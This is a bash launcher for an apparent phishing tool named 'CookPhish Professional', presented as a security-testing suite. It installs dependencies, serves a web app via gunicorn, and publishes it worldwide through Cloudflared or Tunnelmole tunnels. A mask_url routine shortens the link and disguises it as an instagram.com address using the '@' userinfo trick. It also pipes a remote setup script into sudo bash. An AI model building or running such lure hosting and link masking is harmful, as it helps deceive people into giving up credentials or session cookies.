#!/bin/bash

# Enhanced Colors and Styling
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[1;31m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

echo -e "${GREEN}[+] Starting CookPhish Professional...${RESET}\n"

# Function to check version, install if not present
check_and_install() {
    local cmd=$1
    local pkg=$2
    local version_output

    version_output=$($cmd --version 2>/dev/null)

    if [ $? -eq 0 ]; then
        echo -e "${BLUE}[✔] $cmd found: $version_output${RESET}"
    else
        echo -e "${RED}[✘] $cmd not found. Installing $pkg...${RESET}"
        pkg install -y "$pkg"
        echo -e "${GREEN}[✔] $pkg installed.${RESET}"
    fi
}

# Check and install dependencies
check_and_install git git
check_and_install curl curl
check_and_install python python
check_and_install pip python-pip

# Python dependencies
if [ -f "requirements.txt" ]; then
    echo -e "\n${YELLOW}[!] Installing Python dependencies from requirements.txt...${RESET}"
    pip install -r requirements.txt
    echo -e "${GREEN}[✔] Python requirements installed.${RESET}"
else
    echo -e "${RED}[✘] requirements.txt not found. Skipping Python dependencies...${RESET}"
fi

# All done
echo -e "\n${CYAN}[>] All set! Running CookPhish Professional...${RESET}"

echo -e "\033[1;36m[>] Running CookPhish Professional script...\033[0m"

export VERSION="Professional v4.0"
USER_DATA_FILE=".cookphish_user"

# Welcome screen function
welcome_screen() {
    clear
    echo -e "${PURPLE}${BOLD}"
    echo -e "╔════════════════════════════════════════════════════════════════════════╗"
    echo -e "║                                                                        ║"
    echo -e "║    🎉 Welcome to CookPhish Professional Security Testing Suite! 🎉    ║"
    echo -e "║                                                                        ║"
    echo -e "║                     Advanced Penetration Testing Tool                 ║"
    echo -e "║                          Professional Edition                         ║"
    echo -e "║                                                                        ║"
    echo -e "╚════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "${CYAN}${BOLD}[FIRST TIME SETUP]${RESET} ${CYAN}Let's get you started!${RESET}\n"
    
    while true; do
        echo -e -n "${YELLOW}${BOLD}[INPUT]${RESET} ${YELLOW}Please enter your name: ${RESET}"
        read -r username
        
        if [[ -n "$username" && "$username" != " " ]]; then
            break
        else
            echo -e "${RED}[ERROR] Name cannot be empty. Please try again.${RESET}"
        fi
    done
    
    echo -e -n "${YELLOW}${BOLD}[INPUT]${RESET} ${YELLOW}Enter your organization/company (optional): ${RESET}"
    read -r organization
    organization=${organization:-"Security Professional"}
    
    # Save user data
    echo "USERNAME=$username" > "$USER_DATA_FILE"
    echo "ORGANIZATION=$organization" >> "$USER_DATA_FILE"
    echo "FIRST_RUN=$(date '+%Y-%m-%d %H:%M:%S')" >> "$USER_DATA_FILE"
    echo "LAST_ACCESS=$(date '+%Y-%m-%d %H:%M:%S')" >> "$USER_DATA_FILE"
    
    clear
    echo -e "${GREEN}${BOLD}"
    echo -e "╔════════════════════════════════════════════════════════════════════════╗"
    echo -e "║                                                                        ║"
    echo -e "║                    🎊 Setup Complete! 🎊                              ║"
    echo -e "║                                                                        ║"
    echo -e "║              Welcome aboard, ${username}!                    ║"
    echo -e "║                                                                        ║"
    echo -e "║         Your professional security testing environment is ready!       ║"
    echo -e "║                                                                        ║"
    echo -e "╚════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "${BLUE}${BOLD}[PROFILE CREATED]${RESET}"
    echo -e "• Name: ${GREEN}${username}${RESET}"
    echo -e "• Organization: ${GREEN}${organization}${RESET}"
    echo -e "• Registration: ${GREEN}$(date '+%Y-%m-%d %H:%M:%S')${RESET}\n"
    
    echo -e "${CYAN}Press any key to continue...${RESET}"
    read -n 1 -s
}

# Load user data
load_user_data() {
    if [[ -f "$USER_DATA_FILE" ]]; then
        source "$USER_DATA_FILE"
        # Update last access time
        sed -i "s/LAST_ACCESS=.*/LAST_ACCESS=$(date '+%Y-%m-%d %H:%M:%S')/" "$USER_DATA_FILE" 2>/dev/null || {
            # Fallback for systems where sed -i doesn't work
            cp "$USER_DATA_FILE" "${USER_DATA_FILE}.tmp"
            sed "s/LAST_ACCESS=.*/LAST_ACCESS=$(date '+%Y-%m-%d %H:%M:%S')/" "${USER_DATA_FILE}.tmp" > "$USER_DATA_FILE"
            rm "${USER_DATA_FILE}.tmp"
        }
        return 0
    else
        return 1
    fi
}

# Welcome back screen
welcome_back_screen() {
    local current_time=$(date '+%H:%M')
    local greeting
    
    # Time-based greeting
    hour=$(date '+%H')
    if [ "$hour" -lt 12 ]; then
        greeting="Good Morning"
    elif [ "$hour" -lt 17 ]; then
        greeting="Good Afternoon"  
    else
        greeting="Good Evening"
    fi
    
    clear
    echo -e "${GREEN}${BOLD}"
    echo -e "╔════════════════════════════════════════════════════════════════════════╗"
    echo -e "║                                                                        ║"
    echo -e "║                    🚀 Welcome Back, ${USERNAME}! 🚀                   ║"
    echo -e "║                                                                        ║"
    echo -e "║                      ${greeting} • $(date '+%d %B %Y')                    ║"
    echo -e "║                                                                        ║"
    echo -e "╚════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "${BLUE}${BOLD}[USER PROFILE]${RESET}"
    echo -e "• Name: ${GREEN}${USERNAME}${RESET}"
    echo -e "• Organization: ${GREEN}${ORGANIZATION}${RESET}"
    echo -e "• Member Since: ${GREEN}${FIRST_RUN}${RESET}"
    echo -e "• Current Session: ${GREEN}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
    echo -e ""
    
    echo -e "${PURPLE}${BOLD}[PROFESSIONAL STATUS]${RESET}"
    echo -e "${GREEN}✓ Professional License: ${BOLD}ACTIVE${RESET}"
    echo -e "${GREEN}✓ Session Duration: ${BOLD}UNLIMITED${RESET}"
    echo -e "${GREEN}✓ Advanced Features: ${BOLD}ENABLED${RESET}"
    echo -e "${GREEN}✓ All Tools: ${BOLD}AVAILABLE${RESET}"
    echo -e ""
    
    echo -e "${CYAN}Press any key to continue to main menu...${RESET}"
    read -n 1 -s
}

banner() {
    # Enhanced banner with professional look
    COLORS=('\033[1;31m' '\033[1;32m' '\033[1;33m' '\033[1;34m' '\033[1;35m' '\033[1;36m')
    RESET='\033[0m'
    RANDOM_COLOR=${COLORS[$RANDOM % ${#COLORS[@]}]}

    clear
    echo -e "${RANDOM_COLOR}"
    echo -e "╔══════════════════════════════════════════════════════════════════════╗"
    echo -e "║                                                                      ║"
    echo -e "║ ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗ ║"
    echo -e "║██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║ ║"
    echo -e "║██║     ██║   ██║██║   ██║█████╔╝ ██████╔╝███████║██║███████╗███████║ ║"
    echo -e "║██║     ██║   ██║██║   ██║██╔═██╗ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║ ║"
    echo -e "║╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║     ██║  ██║██║███████║██║  ██║ ║"
    echo -e "║ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ║"
    echo -e "║                                                                      ║"
    echo -e "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}${PURPLE}${BOLD}"
    echo -e "             ┌─────────────────────────────────────────────┐"
    echo -e "             │         🔥 PROFESSIONAL EDITION 🔥         │"
    echo -e "             │        Advanced Security Testing Tool       │"
    echo -e "             │              ${VERSION}                │"
    echo -e "             └─────────────────────────────────────────────┘"
    echo -e "${RESET}${CYAN}${DIM}"
    echo -e "                    Created by Technical White Hat"
    echo -e "                       Professional Security Tools"
    
    # Show user info in banner if available
    if [[ -n "$USERNAME" ]]; then
        echo -e "${RESET}${YELLOW}${BOLD}"
        echo -e "                    ┌─────────────────────────────┐"
        echo -e "                    │     Active User: ${USERNAME}     │"
        echo -e "                    └─────────────────────────────┘"
    fi
    
    echo -e "${RESET}\n"
    
    # Professional status indicators
    echo -e "${GREEN}${BOLD}[STATUS]${RESET} ${GREEN}✓ Professional License Active${RESET}"
    echo -e "${BLUE}${BOLD}[STATUS]${RESET} ${BLUE}✓ Unlimited Session Time${RESET}"
    echo -e "${PURPLE}${BOLD}[STATUS]${RESET} ${PURPLE}✓ Advanced Features Enabled${RESET}"
    echo -e ""
}

cleanup() {
    echo -e "\n${YELLOW}${BOLD}[CLEANUP]${RESET} ${YELLOW}Stopping all services...${RESET}"
    
    if pgrep -f "cloudflared" > /dev/null; then
        killall cloudflared
        echo -e "${YELLOW}[!] Cloudflared stopped.${RESET}"
    fi

    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null || pgrep -f "x-www-browser" > /dev/null; then
        pkill -f "tunnelmole"
        pkill -f "tmole"
        pkill -f "x-www-browser"
        echo -e "${YELLOW}[!] Tunnelmole stopped.${RESET}"
    fi

    if pgrep -f "gunicorn" > /dev/null; then
        pkill -f "gunicorn"
        echo -e "${YELLOW}[!] Web application stopped.${RESET}"
        sleep 1
    fi

    if [[ -n "$VIRTUAL_ENV" ]]; then
        deactivate
    fi
    
    echo -e "${GREEN}${BOLD}[SUCCESS]${RESET} ${GREEN}All services stopped successfully!${RESET}"
    echo -e "${CYAN}${BOLD}Thank you for using CookPhish Professional!${RESET}\n"
    exit 0
}

trap cleanup SIGINT

clean_background_process(){
    if pgrep -f "cloudflared" > /dev/null; then
        killall cloudflared
        echo -e "${YELLOW}[!] Cloudflared stopped.${RESET}"
    fi

    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null || pgrep -f "x-www-browser" > /dev/null; then
        pkill -f "tunnelmole"
        pkill -f "tmole"
        pkill -f "x-www-browser"
        echo -e "${YELLOW}[!] Tunnelmole stopped.${RESET}"
    fi

    if pgrep -f "gunicorn" > /dev/null; then
        pkill -f "gunicorn"
        echo -e "${YELLOW}[!] Web application stopped.${RESET}"
        sleep 1
    fi

    if [[ -n "$VIRTUAL_ENV" ]]; then
        deactivate
    fi
}

check_update() {
    git fetch origin 2>/dev/null
    banner
    LOCAL_COMMIT=$(git rev-parse HEAD 2>/dev/null)
    REMOTE_COMMIT=$(git rev-parse origin/$(git rev-parse --abbrev-ref HEAD) 2>/dev/null)

    if [ "$LOCAL_COMMIT" != "$REMOTE_COMMIT" ]; then
        echo -e "${YELLOW}${BOLD}[UPDATE AVAILABLE]${RESET}"
        echo -e "┌─────────────────────────────────────────────┐"
        echo -e "│ A new update is available for your tool!   │"
        echo -e "│ New version: ${VERSION}                │"
        echo -e "└─────────────────────────────────────────────┘"
        echo -e -n "\n${YELLOW}[?] Do you want to update now? (Y/N): ${RESET}"
        read -r response
        response=${response:-"Y"}

        if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
            echo -e "\n${CYAN}[UPDATING]${RESET} ${CYAN}Downloading latest version...${RESET}"
            sleep 1
            git reset --hard 2>/dev/null
            git pull 2>/dev/null
            banner
            echo -e "${GREEN}${BOLD}[SUCCESS]${RESET} ${GREEN}Update completed successfully!${RESET}"
            echo -e "${BLUE}[INFO] Restarting with new version...${RESET}\n"
            sleep 2
            exec bash "$BASH_SOURCE"
        else
            echo -e "${RED}[SKIPPED] Update declined by user.${RESET}\n"
            sleep 1
        fi
    else
        echo -e "${GREEN}${BOLD}[UP TO DATE]${RESET} ${GREEN}You're running the latest version!${RESET}\n"
        sleep 2
    fi
}

cloudflared_install() {
    if [ -d "/data/data/com.termux" ]; then
        if ! command -v curl &> /dev/null; then
            pkg install -y curl
        fi
        banner
        echo -e "${CYAN}${BOLD}[TERMUX DETECTED]${RESET} ${CYAN}Installing Cloudflared for Termux environment...${RESET}\n"
        
        export TERMUX_PREFIX=~/../usr/
        curl -LO https://github.com/cloudflare/cloudflared/archive/refs/tags/2025.1.0.tar.gz
        tar -xvzf 2025.1.0.tar.gz
        cd cloudflared-2025.1.0 || exit 1
        pkg install -y golang
        go build -v -ldflags "-X \"main.Version=2025.1.0\" -X \"main.BuildTime=$(date -u '+%Y.%m.%d-%H:%M UTC')\"" ./cmd/cloudflared
        install -Dm700 -t "$TERMUX_PREFIX/bin" cloudflared
        cd ../
        rm 2025.1.0.tar.gz*
        rm -rf ./cloudflared*
        banner
        echo -e "${GREEN}${BOLD}[SUCCESS]${RESET} ${GREEN}Cloudflared 2025.1.0 installed successfully!${RESET}"
        echo -e "${BLUE}[INFO] Installation path: ${BOLD}$TERMUX_PREFIX/bin${RESET}\n"
    
    else
        if ! command -v curl &> /dev/null; then
            sudo apt install -y curl
        fi
        banner
        echo -e "${CYAN}${BOLD}[LINUX DETECTED]${RESET} ${CYAN}Installing Cloudflared for Linux environment...${RESET}\n"
        
        sudo curl -L -o /usr/local/bin/cloudflared https://github.com/cloudflare/cloudflared/releases/download/2025.1.0/cloudflared-linux-amd64
        sudo chmod +x /usr/local/bin/cloudflared

        banner
        echo -e "${GREEN}${BOLD}[SUCCESS]${RESET} ${GREEN}Cloudflared installed successfully!${RESET}"
        echo -e "${BLUE}[INFO] Installation path: ${BOLD}/usr/local/bin/cloudflared${RESET}\n"
    fi
}

check_dependencies() {
    echo -e "${CYAN}${BOLD}[DEPENDENCY CHECK]${RESET} ${CYAN}Verifying required components...${RESET}\n"
    
    if ! cloudflared --version 2>/dev/null | grep -q '2025.1.0'; then
        cloudflared_install
    fi

    if ! command -v node &> /dev/null; then
        echo -e "${YELLOW}[INSTALL] Node.js not found. Installing...${RESET}"
        
        if [ -d "/data/data/com.termux" ]; then
            pkg update -y && pkg install -y nodejs
        else
            curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
            sudo apt-get install -y nodejs
        fi
        echo -e "${GREEN}[SUCCESS] Node.js installed.${RESET}"
    fi

    if ! command -v tunnelmole &> /dev/null; then
        echo -e "${YELLOW}[INSTALL] Tunnelmole not found. Installing...${RESET}"
        
        if [ -d "/data/data/com.termux" ]; then
            npm install -g tunnelmole
        else
            sudo npm install -g tunnelmole
        fi
        echo -e "${GREEN}[SUCCESS] Tunnelmole installed.${RESET}"
    fi

    if ! command -v jq &> /dev/null; then
        echo -e "${YELLOW}[INSTALL] jq not found. Installing...${RESET}"
        if [ -d "/data/data/com.termux" ]; then
            pkg update -y && pkg install -y jq
        else
            sudo apt-get update -y && sudo apt-get install -y jq
        fi
        echo -e "${GREEN}[SUCCESS] jq installed.${RESET}"
    fi
    
    echo -e "${GREEN}${BOLD}[COMPLETE]${RESET} ${GREEN}All dependencies verified!${RESET}\n"
}

install_python_dependencies() {
    if [ ! -f "./env/bin/activate" ]; then
        echo -e "${YELLOW}[SETUP] Creating Python virtual environment...${RESET}"
        sleep 1
        python3 -m venv env
    fi
    source ./env/bin/activate
    pip install --upgrade pip
    pip install -r requirements.txt
    banner
    echo -e "${GREEN}${BOLD}[ENVIRONMENT]${RESET} ${GREEN}Python environment ready!${RESET}\n"
    sleep 1
}

mask_url() {
    local long_url="$1"
    
    echo -e "${CYAN}[PROCESSING] Shortening URL...${RESET}"
    sleep 1
    local short_url=$(short_url "$long_url")

    echo -e -n "${YELLOW}[INPUT] Enter custom domain (default: instagram.com): ${RESET}"
    read -r custom_domain
    custom_domain=${custom_domain:-"instagram.com"}
    
    echo -e "${CYAN}[PROCESSING] Creating masked URL...${RESET}\n"
    local masked_url=$(echo "$short_url" | sed "s|https://|https://${custom_domain}@|")
    sleep 2
    banner

    echo -e "${GREEN}${BOLD}[MASKED URL GENERATED]${RESET}"
    echo -e "╔══════════════════════════════════════════════════════════════════╗"
    echo -e "║                                                                  ║"
    echo -e "║  ${GREEN}${BOLD}🔗 Your Masked URL:${RESET}                                         ║"
    echo -e "║                                                                  ║"
    echo -e "║  ${CYAN}${masked_url}${RESET}     ║"
    echo -e "║                                                                  ║"
    echo -e "╚══════════════════════════════════════════════════════════════════╝"
    echo -e ""
}

short_url() {
    local long_url="$1"
    local api_endpoint="https://ulvis.net/API/write/post"
    
    local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
    if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
        echo "$(echo "$response" | jq -r '.data.url')"
    else
        echo "$long_url"  
    fi
}

select_methode () {
    banner

    echo -e "${PURPLE}${BOLD}[DEPLOYMENT OPTIONS]${RESET}"
    echo -e "╔═══════════════════════════════════════╗"
    echo -e "║                                       ║"
    echo -e "║  ${BOLD}1.${RESET} ${GREEN}🏠 Localhost${RESET} ${DIM}(Local Network)${RESET}     ║"
    echo -e "║                                       ║"
    echo -e "║  ${BOLD}2.${RESET} ${BLUE}☁️  Cloudflared${RESET} ${DIM}(Global Access)${RESET}  ║"
    echo -e "║                                       ║"
    echo -e "║  ${BOLD}3.${RESET} ${CYAN}🌐 Tunnelmole${RESET} ${DIM}(Alternative)${RESET}     ║"
    echo -e "║                                       ║"
    echo -e "╚═══════════════════════════════════════╝"
    echo -e ""

    while true; do
        echo -e -n "${YELLOW}${BOLD}[SELECTION]${RESET} ${YELLOW}Choose deployment method (1-3): ${RESET}"
        read choose
        
        if [[ "$choose" =~ ^[1-3]$ ]]; then
            break  
        else
            echo -e "${RED}[ERROR] Please enter a valid option (1-3)!${RESET}"
        fi
    done

    while true; do
        echo -e -n "${YELLOW}${BOLD}[PORT]${RESET} ${YELLOW}Enter port number (default 8080): ${RESET}"
        read port
        port=${port:-8080}  

        if [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
            break  
        else
            echo -e "${RED}[ERROR] Invalid port. Please enter 1-65535.${RESET}"
        fi
    done  

    banner

    case $choose in
        1)
            echo -e "${GREEN}${BOLD}[LOCALHOST]${RESET} ${GREEN}Starting local server on port $port...${RESET}"
            gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
            sleep 2
            banner
            echo -e "${GREEN}${BOLD}[LOCAL SERVER ACTIVE]${RESET}"
            echo -e "╔═══════════════════════════════════════════════════════════════╗"
            echo -e "║                                                               ║"
            echo -e "║  ${GREEN}${BOLD}🌐 Local URL:${RESET}                                            ║"
            echo -e "║                                                               ║"
            echo -e "║  ${CYAN}${BOLD}http://127.0.0.1:$port${RESET}                                ║"
            echo -e "║                                                               ║"
            echo -e "║  ${BLUE}${DIM}Access from your local network${RESET}                        ║"
            echo -e "║                                                               ║"
            echo -e "╚═══════════════════════════════════════════════════════════════╝"
            ;;

        2)
            echo -e "${BLUE}${BOLD}[CLOUDFLARED]${RESET} ${BLUE}Starting server with global tunnel...${RESET}"
            gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
            sleep 2
            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:$port 2>/dev/null & 
            echo -e "${BLUE}[TUNNEL] Establishing Cloudflared connection...${RESET}"

            original_url=""
            while [[ -z "$original_url" || "$original_url" == "null" ]]; do
                original_url=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
                sleep 1 
            done

            banner
            echo -e "${BLUE}${BOLD}[CLOUDFLARED ACTIVE]${RESET}"
            echo -e "╔═══════════════════════════════════════════════════════════════╗"
            echo -e "║                                                               ║"
            echo -e "║  ${BLUE}${BOLD}🔗 Global URL:${RESET}                                           ║"
            echo -e "║                                                               ║"
            echo -e "║  ${CYAN}${BOLD}https://${original_url}${RESET}                    ║"
            echo -e "║                                                               ║"
            echo -e "║  ${GREEN}${DIM}Accessible worldwide via Cloudflare${RESET}                   ║"
            echo -e "║                                                               ║"
            echo -e "╚═══════════════════════════════════════════════════════════════╝"

            echo -e -n "\n${YELLOW}${BOLD}[MASKING]${RESET} ${YELLOW}Do you want to create a masked URL? (Y/N): ${RESET}"
            read -r response
            response=${response:-"Y"}

            if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
                mask_url https://${original_url}
            else
                echo -e "${RED}[SKIP] URL masking skipped.${RESET}\n"
            fi
            ;;

        3)
            echo -e "${CYAN}${BOLD}[TUNNELMOLE]${RESET} ${CYAN}Starting server with Tunnelmole...${RESET}"
            gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
            sleep 2
            echo -e "${CYAN}[TUNNEL] Establishing Tunnelmole connection on port $port...${RESET}"
            sleep 1
            banner
            echo -e "${CYAN}${BOLD}[TUNNELMOLE ACTIVE]${RESET}\n"
            tunnelmole $port 
            ;;

        *)
            echo -e "${RED}[ERROR] Invalid selection!${RESET}"
            sleep 1
            select_methode  
            ;;
    esac
}

# Enhanced status messages
show_running_status() {
    echo -e "${GREEN}${BOLD}[RUNNING]${RESET} ${GREEN}CookPhish Professional is now active!${RESET}"
    echo -e "${BLUE}[INFO] Session: Unlimited duration${RESET}"
    echo -e "${PURPLE}[INFO] All professional features enabled${RESET}"
    echo -e "${CYAN}[INFO] Press Ctrl+C to stop the server${RESET}\n"
}

# Main execution with user management
main() {
    # Check if user data exists
    if load_user_data; then
        welcome_back_screen
    else
        welcome_screen
        load_user_data
    fi
    
    check_update
    clean_background_process
    install_python_dependencies
    check_dependencies
    select_methode
    show_running_status

    # Keep the script running indefinitely (no time limit)
    while true; do
        sleep 10
    done
}

# Start the application
main